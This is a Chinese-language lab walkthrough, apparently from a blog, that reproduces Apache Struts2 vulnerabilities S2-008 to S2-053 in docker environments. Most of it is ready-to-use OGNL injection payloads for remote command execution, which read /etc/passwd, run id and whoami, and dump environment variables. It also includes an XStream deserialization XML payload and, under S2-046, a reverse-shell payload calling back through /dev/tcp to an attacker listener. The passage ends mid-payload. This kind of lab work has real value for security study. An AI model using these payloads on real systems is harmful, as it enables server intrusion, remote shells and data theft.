+<h1 id="S2-008"><a href="#S2-008" class="headerlink" title="S2-008"></a>S2-008</h1><p>s2-008漏洞产生的原因，主要是利用对传入参数没有严格限制，导致多个地方可以执行恶意代码，传入?debug=command&amp;expression=即可执行OGNL表达式</p>
+<p>进入s2-008的docker环境</p>
+<p><img src="/images/struts2/image-20210820201543150.png" alt="image-20210820201543150"></p>
+<p>在GET包处添加payload执行whoami</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">devmode.action?debug=command&amp;expression=(%23_memberAccess=<span class="meta">@ognl</span>.OgnlContext<span class="meta">@DEFAULT_MEMBER_ACCESS</span>)%<span class="number">3f</span>(%23context[%23parameters.rpsobj[<span class="number">0</span>]].getWriter().println(<span class="meta">@org</span>.apache.commons.io.IOUtils<span class="meta">@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream())</span>)):xx.toString.json&amp;rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;content=<span class="number">123456789</span>&amp;command=whoami</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/images/struts2/image-20210820201932013.png" alt="image-20210820201932013"></p>
+<h1 id="S2-009"><a href="#S2-009" class="headerlink" title="S2-009"></a>S2-009</h1><p>Struts2对S2-003的修复方法是禁止#号，于是s2-005通过使用编码\u0023或\43来绕过；后来Struts2对S2-005的修复方法是禁止\等特殊符号，使用户不能提交反斜线。</p>
+<p>但是，如果当前action中接受了某个参数example，这个参数将进入OGNL的上下文。所以，我们可以将OGNL表达式放在example参数中，然后使用<code>/helloword.acton?example=&lt;OGNL statement&gt;&amp;(example)(&#39;xxx&#39;)=1</code>的方法来执行它，从而绕过官方对#、\等特殊字符的防御。</p>
+<p>影响版本Struts 2.1.0-2.3.1.1</p>
+<p>进入S2-009的docker环境</p>
+<p><img src="/images/struts2/image-20210820202028600.png" alt="image-20210820202028600"></p>
+<p>访问<code>192.168.1.8:8080/ajax/example5</code>，此为存在漏洞的界面</p>
+<p><img src="/images/struts2/image-20210820202342908.png" alt="image-20210820202342908"></p>
+<p>将payload拼接读取passwd文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.8:8080/ajax/example5?age=12313&amp;name=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec(&quot;cat /etc/passwd&quot;).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d),%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close())(meh)&amp;z[(name)(%27meh%27)]</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/images/struts2/image-20210820202445353.png" alt="image-20210820202445353"></p>
+<h1 id="S2-012"><a href="#S2-012" class="headerlink" title="S2-012"></a>S2-012</h1><p>如果在配置 Action 中 Result 时使用了重定向类型，并且还使用 ${param_name} 作为重定向变量，例如：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="keyword">package</span> name=<span class="string">&quot;S2-012&quot;</span> extends=<span class="string">&quot;struts-default&quot;</span>&gt;</span><br><span class="line">    &lt;action name=<span class="string">&quot;user&quot;</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">&quot;com.demo.action.UserAction&quot;</span>&gt;</span><br><span class="line">        &lt;result name=<span class="string">&quot;redirect&quot;</span> type=<span class="string">&quot;redirect&quot;</span>&gt;/index.jsp?name=$&#123;</span><br><span class="line">    name&#125;&lt;/result&gt;</span><br><span class="line">        &lt;result name=<span class="string">&quot;input&quot;</span>&gt;/index.jsp&lt;/result&gt;</span><br><span class="line">        &lt;result name=<span class="string">&quot;success&quot;</span>&gt;/index.jsp&lt;/result&gt;</span><br><span class="line">    &lt;/action&gt;</span><br><span class="line">&lt;/<span class="keyword">package</span>&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>这里 UserAction 中定义有一个 name 变量，当触发 redirect 类型返回时，Struts2 获取使用 ${name} 获取其值，在这个过程中会对 name 参数的值执行 OGNL 表达式解析，从而可以插入任意 OGNL 表达式导致命令执行</p>
+<p>进入s2-012的docker环境</p>
+<p><img src="/images/struts2/image-20210820202514897.png" alt="image-20210820202514897"></p>
+<p>直接在文本框内执行payload读取passwd</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;#a=(<span class="keyword">new</span> java.lang.ProcessBuilder(<span class="keyword">new</span> java.lang.String[]&#123;<span class="string">&quot;cat&quot;</span>, <span class="string">&quot;/etc/passwd&quot;</span>&#125;)).redirectErrorStream(<span class="keyword">true</span>).start(),#b=#a.getInputStream(),#c=<span class="keyword">new</span> java.io.InputStreamReader(#b),#d=<span class="keyword">new</span> java.io.BufferedReader(#c),#e=<span class="keyword">new</span> <span class="keyword">char</span>[<span class="number">50000</span>],#d.read(#e),#f=#context.get(<span class="string">&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;</span>),#f.getWriter().println(<span class="keyword">new</span> java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/images/struts2/image-20210820202801450.png" alt="image-20210820202801450"></p>
+<p>点击提交即可读取到passwd</p>
+<p><img src="/images/struts2/image-20210820202815589.png" alt="image-20210820202815589"></p>
+<h1 id="S2-013"><a href="#S2-013" class="headerlink" title="S2-013"></a>S2-013</h1><p>Struts2 标签中 &lt;s:a&gt; 和 &lt;s:url&gt; 都包含一个 includeParams 属性，其值可设置为 none，get 或 all，参考官方其对应意义如下： none - 链接不包含请求的任意参数值（默认） get - 链接只包含 GET 请求中的参数和其值 all - 链接包含 GET 和 POST 所有参数和其值 &lt;s:a&gt;用来显示一个超链接，当includeParams=all的时候，会将本次请求的GET和POST参数都放在URL的GET参数上。在放置参数的过程中会将参数进行OGNL渲染，造成任意命令执行漏洞。</p>
+<p>进入s2-013的docker环境</p>
+<p><img src="/images/struts2/image-20210820202858851.png" alt="image-20210820202858851"></p>
+<p>这里直接构造链接并进行url编码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$&#123;(#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#a=@java.lang.Runtime@getRuntime().exec(&#x27;id&#x27;).getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[50000],#c.read(#d),#out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#out.println(#d),#out.close())&#125;</span><br><span class="line"></span><br><span class="line">// 或</span><br><span class="line"></span><br><span class="line">$&#123;#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#x27;id&#x27;).getInputStream())&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>认准exec执行系统命令即可，flag在环境变量里面，构造：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.8:8080/link.action?a=%24%7B%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%27env%27).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23out.println(%27dbapp%3D%27%2Bnew%20java.lang.String(%23d))%2C%23out.close()%7D</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/images/struts2/image-20210820203053370.png" alt="image-20210820203053370"></p>
+<h1 id="S2-015"><a href="#S2-015" class="headerlink" title="S2-015"></a>S2-015</h1><p>s2-015漏洞远程攻击者可借助带有‘${}’和‘%{}’序列值（可导致判断OGNL代码两次）的请求，利用该漏洞执行任意OGNL代码</p>
+<p>进入s2-015的docker环境</p>
+<p><img src="/images/struts2/image-20210820203124142.png" alt="image-20210820203124142"></p>
+<p>首先构造{1+1}得到payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.8:8080/$&#123;1+1&#125;.action</span><br></pre></td></tr></table></figure>
+
+
+
+<p>执行后自动编码得到如下，在message处会回显</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.8:8080/$%7B1+1%7D.action</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/images/struts2/image-20210820203720352.png" alt="image-20210820203720352"></p>
+<p>构造payload显示id</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.8:8080/%24%7b%23%63%6f%6e%74%65%78%74%5b%27%78%77%6f%72%6b%2e%4d%65%74%68%6f%64%41%63%63%65%73%73%6f%72%2e%64%65%6e%79%4d%65%74%68%6f%64%45%78%65%63%75%74%69%6f%6e%27%5d%3d%66%61%6c%73%65%2c%23%6d%3d%23%5f%6d%65%6d%62%65%72%41%63%63%65%73%73%2e%67%65%74%43%6c%61%73%73%28%29%2e%67%65%74%44%65%63%6c%61%72%65%64%46%69%65%6c%64%28%27%61%6c%6c%6f%77%53%74%61%74%69%63%4d%65%74%68%6f%64%41%63%63%65%73%73%27%29%2c%23%6d%2e%73%65%74%41%63%63%65%73%73%69%62%6c%65%28%74%72%75%65%29%2c%23%6d%2e%73%65%74%28%23%5f%6d%65%6d%62%65%72%41%63%63%65%73%73%2c%74%72%75%65%29%2c%23%71%3d%40%6f%72%67%2e%61%70%61%63%68%65%2e%63%6f%6d%6d%6f%6e%73%2e%69%6f%2e%49%4f%55%74%69%6c%73%40%74%6f%53%74%72%69%6e%67%28%40%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%40%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%27%69%64%27%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%29%2c%23%71%7d%2e%61%63%74%69%6f%6e</span><br></pre></td></tr></table></figure>
+
+
+
+<p>这里在message处得到id需要进行url解码</p>
+<p><img src="/images/struts2/image-20210820203833648.png" alt="image-20210820203833648"></p>
+<p><img src="/images/struts2/image-20210820203847174.png" alt="image-20210820203847174"></p>
+<h1 id="S2-016"><a href="#S2-016" class="headerlink" title="S2-016"></a>S2-016</h1><p>在struts2中，DefaultActionMapper类支持以”action:”、“redirect:”、”redirectAction:”作为导航或是重定向前缀，但是这些前缀后面同时可以跟OGNL表达式，由于struts2没有对这些前缀做过滤，导致利用OGNL表达式调用java静态方法执行任意系统命令</p>
+<p>进入s2-016的docker环境</p>
+<p><img src="/images/struts2/image-20210820204024530.png" alt="image-20210820204024530"></p>
+<p>构造payload执行，可以发现执行过后网址后面出现了id</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.8:8080/index.action?redirect:%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23f.setAccessible%28true%29%2C%23f.set%28%23_memberAccess%2Ctrue%29%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27id%27%29.getInputStream%28%29%29%7D</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/images/struts2/image-20210820204259928.png" alt="image-20210820204259928"></p>
+<h1 id="S2-032"><a href="#S2-032" class="headerlink" title="S2-032"></a>S2-032</h1><p>当启用动态方法调用时，可以传递可用于在服务器端执行任意代码的恶意表达式。<br> method:<name> Action 前缀去调用声明为 public 的函数，只不过在低版本中 Strtus2 不会对 name 方法值做 OGNL 计算，而在高版本中会。.</p>
+<p>进入s2-032的docker环境</p>
+<p><img src="/images/struts2/image-20210820204533348.png" alt="image-20210820204533348"></p>
+<p>构造payload返回1001060253718则代表可代码执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.8:8080/memoindex.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23context[%23parameters.obj[0]].getWriter().print(%23parameters.content[0]%2b602%2b53718),1?%23xx:%23request.toString&amp;obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;content=10010</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/images/struts2/image-20210820204647284.png" alt="image-20210820204647284"></p>
+<p>构造payload输出id</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.8:8080/index.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&amp;pp=%5C%5CA&amp;ppp=%20&amp;encoding=UTF-8&amp;cmd=id</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/images/struts2/image-20210820204727151.png" alt="image-20210820204727151"></p>
+<h1 id="S2-045"><a href="#S2-045" class="headerlink" title="S2-045"></a>S2-045</h1><p>Apache Struts 2被曝存在远程命令执行漏洞，漏洞编号S2-045，CVE编号CVE-2017-5638，在使用基于Jakarta插件的文件上传功能时，有可能存在远程命令执行，导致系统被黑客入侵。恶意用户可在上传文件时通过修改HTTP请求头中的Content-Type值来触发该漏洞，进而执行系统命令。</p>
+<p>影响范围</p>
+<p>Struts 2.3.5 – Struts 2.3.31 Struts 2.5 – Struts 2.5.10</p>
+<p>进入s2-045的docker环境</p>
+<p><img src="/images/struts2/image-20210820204904315.png" alt="image-20210820204904315"></p>
+<p>构造payload任意命令执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Type:&quot;%&#123;(#xxx=&#x27;multipart/form-data&#x27;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#x27;&quot;pwd&quot;&#x27;).(#iswin=(@java.lang.System@getProperty(&#x27;os.name&#x27;).toLowerCase().contains(&#x27;win&#x27;))).(#cmds=(#iswin?&#123;&#x27;cmd.exe&#x27;,&#x27;/c&#x27;,#cmd&#125;:&#123;&#x27;/bin/bash&#x27;,&#x27;-c&#x27;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>对于payload的一些解释</p>
+<p>来获取上下文容器 #container=#context[‘com.opensymphony.xwork2.ActionContext.container’]<br>通过容器实例化，对Ognl API的通用访问，设置和获取属性 #ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class<br>判断目标主机的操作系统类型，并进行执行命令赋值 #iswin=(@java.lang.System@getProperty(‘os.name’).toLowerCase().contains(‘win’))).(#cmds=(#iswin?{‘cmd.exe’,’/c’,#cmd}:{‘/bin/bash’,’-c’,#cmd })<br>执行攻击命令 #p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush()) </p>
+<p><img src="/images/struts2/image-20210820205223939.png" alt="image-20210820205223939"></p>
+<h1 id="S2-046"><a href="#S2-046" class="headerlink" title="S2-046"></a>S2-046</h1><p>s2-046漏洞的利用有点特殊，需要满足以下几个条件：</p>
+<p>1、系统必须使用 Jakarta 插件，检查 Struts2 配置文件中是否有以下配置：&lt;constant name =“struts.multipart.parser”value =“jakarta-stream”/&gt;</p>
+<p>2、上传文件的大小（由 Content-LSength 头指定）大于 Struts2 允许的最大大小（2GB）</p>
+<p>3、文件名内容构造恶意的 OGNL 内容。</p>
+<p>如果满足以上要求，Struts2 受影响版本将创建一个包含攻击者控制的异常文件名，使用 OGNL 值堆栈来定位错误消息，OGNL 值堆栈将插入任何 OGNL 变量（$ {}或％{}）作为 OGNL 表达式，然后实现任意代码执行。</p>
+<p>与045相同，046也是OGNL注入，但出现在上传请求的文件名字段中，并且需要NUL字节来拆分有效负载和其余字符串。</p>
+<p>进入s2-046的docker环境</p>
+<p><img src="/images/struts2/image-20210820210918669.png" alt="image-20210820210918669"></p>
+<p>点击submit进行抓包，可以看到这里的filename正常情况下是为空的</p>
+<p><img src="/images/struts2/image-20210820211410270.png" alt="image-20210820211410270"></p>
+<p>构造payload执行1+99</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;#context[<span class="string">&#x27;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#x27;</span>].addHeader(<span class="string">&#x27;X-Test&#x27;</span>,<span class="number">1</span>+<span class="number">99</span>)&#125;\x00b</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/images/struts2/image-20210820211451504.png" alt="image-20210820211451504"></p>
+<p>这里需要进行00截断，进入hex将30改为00</p>
+<p><img src="/images/struts2/image-20210820211609481.png" alt="image-20210820211609481"></p>
+<p><img src="/images/struts2/image-20210820211628553.png" alt="image-20210820211628553"></p>
+<p>然后发包，可以看到X-Test这个地方已经执行了1+99并输出了结果</p>
+<p><img src="/images/struts2/image-20210820211649284.png" alt="image-20210820211649284"></p>
+<p>那么这里就可以构造一个poc进行bash反弹，还是要进行00阶段，nc监听端口，发包即可得到反弹shell</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;%&#123;(#nike=&#x27;multipart/form-data&#x27;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#x27;bash -i &gt;&amp; /dev/tcp/192.168.1.8/7777 0&gt;&amp;1&#x27;).(#iswin=(@java.lang.System@getProperty(&#x27;os.name&#x27;).toLowerCase().contains(&#x27;win&#x27;))).(#cmds=(#iswin?&#123;&#x27;cmd.exe&#x27;,&#x27;/c&#x27;,#cmd&#125;:&#123;&#x27;/bin/bash&#x27;,&#x27;-c&#x27;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;\x00b&quot;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/images/struts2/image-20210820212145810.png" alt="image-20210820212145810"></p>
+<h1 id="S2-048"><a href="#S2-048" class="headerlink" title="S2-048"></a>S2-048</h1><p>这个漏洞主要问题出在struts2-struts1-plugin这个插件包上。这个库的主要作用就是将struts1的action封装成struts2的action以便它能在strut2上运行使用。</p>
+<p>而由于struts2-struts1-plugin 包中的 “Struts1Action.java” 中的 execute 函数可以调用 getText() 函数，这个函数刚好又能执行OGNL表达式，同事这个 getText() 的 参数输入点，又可以被用户直接进行控制，用户可控的值添加到 ActionMessage 并在客户前端展示，导致其进入 getText 函数，最后 message 被当作 ognl 表达式执行如果这个点被恶意攻击者所控制，就可以构造恶意执行代码，从而实现一个RCE攻击。</p>
+<p>进入s2-048的docker环境</p>
+<p><img src="/images/struts2/image-20210820212347293.png" alt="image-20210820212347293"></p>
+<p>进入<code>http://192.168.1.8:8080/integration/saveGangster.action</code>漏洞页面，尝试运算1+1</p>
+<p><img src="/images/struts2/image-20210820212557123.png" alt="image-20210820212557123"></p>
+<p>可以看到这里得到了运算结果，说明存在漏洞</p>
+<p><img src="/images/struts2/image-20210820212611670.png" alt="image-20210820212611670"></p>
+<p>那么这里构造一个payload用来输出id</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;(#dm=<span class="meta">@ognl</span>.OgnlContext<span class="meta">@DEFAULT_MEMBER_ACCESS</span>).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[<span class="string">&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;</span>]).(#ognlUtil=#container.getInstance(<span class="meta">@com</span>.opensymphony.xwork2.ognl.OgnlUtil<span class="meta">@class</span>)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#q=<span class="meta">@org</span>.apache.commons.io.IOUtils<span class="meta">@toString(@java.lang.Runtime@getRuntime().exec(&#x27;id&#x27;).getInputStream())</span>).(#q)&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/images/struts2/image-20210820212650254.png" alt="image-20210820212650254"></p>
+<p>构造payload输出whoami</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;(#dm=<span class="meta">@ognl</span>.OgnlContext<span class="meta">@DEFAULT_MEMBER_ACCESS</span>).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[<span class="string">&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;</span>]).(#ognlUtil=#container.getInstance(<span class="meta">@com</span>.opensymphony.xwork2.ognl.OgnlUtil<span class="meta">@class</span>)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#q=<span class="meta">@org</span>.apache.commons.io.IOUtils<span class="meta">@toString(@java.lang.Runtime@getRuntime().exec(&#x27;whoami&#x27;).getInputStream())</span>).(#q)&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/images/struts2/image-20210820212727336.png" alt="image-20210820212727336"></p>
+<h1 id="S2-052"><a href="#S2-052" class="headerlink" title="S2-052"></a>S2-052</h1><p>s2-052产生漏洞的原因是REST插件使用到XStreamHandler处理xml数据，由于未对xml数据做任何过滤，在进行发序列xml数据转换为Object时导致RCE</p>
+<p>进入s2-052的docker环境</p>
+<p><img src="/images/struts2/image-20210820212839361.png" alt="image-20210820212839361"></p>
+<p>进入页面后随便点击一个成员进行编辑并点击submit进行抓包</p>
+<p><img src="/images/struts2/image-20210820213057203.png" alt="image-20210820213057203"></p>
+<p>这里可以看到Content-Type为<code>application/x-www-form-urlencoded</code></p>
+<p><img src="/images/struts2/image-20210820213115650.png" alt="image-20210820213115650"></p>
+<p>构造一个xml文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;map&gt;</span><br><span class="line"></span><br><span class="line">&lt;entry&gt;</span><br><span class="line"></span><br><span class="line">&lt;jdk.nashorn.internal.objects.NativeString&gt; &lt;flags&gt;0&lt;/flags&gt; &lt;value class=&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt; &lt;dataHandler&gt; &lt;dataSource class=&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt; &lt;is class=&quot;javax.crypto.CipherInputStream&quot;&gt; &lt;cipher class=&quot;javax.crypto.NullCipher&quot;&gt; &lt;initialized&gt;false&lt;/initialized&gt; &lt;opmode&gt;0&lt;/opmode&gt; &lt;serviceIterator class=&quot;javax.imageio.spi.FilterIterator&quot;&gt; &lt;iter class=&quot;javax.imageio.spi.FilterIterator&quot;&gt; &lt;iter class=&quot;java.util.Collections$EmptyIterator&quot;/&gt; &lt;next class=&quot;java.lang.ProcessBuilder&quot;&gt; &lt;command&gt; &lt;string&gt;calc.exe&lt;/string&gt; &lt;/command&gt; &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt; &lt;/next&gt; &lt;/iter&gt; &lt;filter class=&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt; &lt;method&gt; &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt; &lt;name&gt;start&lt;/name&gt; &lt;parameter-types/&gt; &lt;/method&gt; &lt;name&gt;foo&lt;/name&gt; &lt;/filter&gt; &lt;next class=&quot;string&quot;&gt;foo&lt;/next&gt; &lt;/serviceIterator&gt; &lt;lock/&gt; &lt;/cipher&gt; &lt;input class=&quot;java.lang.ProcessBuilder$NullInputStream&quot;/&gt; &lt;ibuffer&gt;&lt;/ibuffer&gt; &lt;done&gt;false&lt;/done&gt; &lt;ostart&gt;0&lt;/ostart&gt; &lt;ofinish&gt;0&lt;/ofinish&gt; &lt;closed&gt;false&lt;/closed&gt; &lt;/is&gt; &lt;consumed&gt;false&lt;/consumed&gt; &lt;/dataSource&gt; &lt;transferFlavors/&gt; &lt;/dataHandler&gt; &lt;dataLen&gt;0&lt;/dataLen&gt; &lt;/value&gt; &lt;/jdk.nashorn.internal.objects.NativeString&gt; &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../jdk.nashorn.internal.objects.NativeString&quot;/&gt; &lt;/entry&gt; &lt;entry&gt; &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt; &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt;</span><br><span class="line"></span><br><span class="line">&lt;/entry&gt;</span><br><span class="line"></span><br><span class="line">&lt;/map&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>首先将Content-Type改为<code>application/xml</code>，然后将xml文件插入，发包返回500证明已经成功</p>
+<p><img src="/images/struts2/image-20210820213325852.png" alt="image-20210820213325852"></p>
+<p><img src="/images/struts2/image-20210820213334682.png" alt="image-20210820213334682"></p>
+<p>进入tmp目录查看success文件已经创建成功</p>
+<p><img src="/images/struts2/image-20210820213409774.png" alt="image-20210820213409774"></p>
+<h1 id="S2-053"><a href="#S2-053" class="headerlink" title="S2-053"></a>S2-053</h1><p>s2-053漏洞产生的原因是Struts2在使用Freemarker模板引擎的时候，同时允许解析OGNL表达式。导致用户输入的数据本身不会被OGNL解析，但由于被Freemarker解析一次后变成离开一个表达式，被OGNL解析第二次，导致任意命令执行漏洞。</p>
+<p>进入s2-053的docker环境</p>
+<p><img src="/images/struts2/image-20210820213630029.png" alt="image-20210820213630029"></p>
+<p>首先执行<code>%&#123;33-1&#125;</code>并提交，可以看到在Your url的地方运算出了结果，说明存在漏洞</p>
+<p><img src="/images/struts2/image-20210820213810431.png" alt="image-20210820213810431"></p>
+<p>构造payload输出id并提交</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;(#dm=<span class="meta">@ognl</span>.OgnlContext<span class="meta">@DEFAULT_MEMBER_ACCESS</span>).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[<span class="string">&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;</span>]).(#ognlUtil=#container.getInstance(<span class="meta">@com</span>.opensymphony.xwork2.ognl.OgnlUtil<span class="meta">@class</span>)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=<span class="string">&#x27;id&#x27;</span>).(#iswin=(<span class="meta">@java</span>.lang.System<span class="meta">@getProperty(&#x27;os.name&#x27;)</span>.toLowerCase().contains(<span class="string">&#x27;win&#x27;</span>))).(#cmds=(#iswin?&#123;<span class="string">&#x27;cmd.exe&#x27;</span>,<span 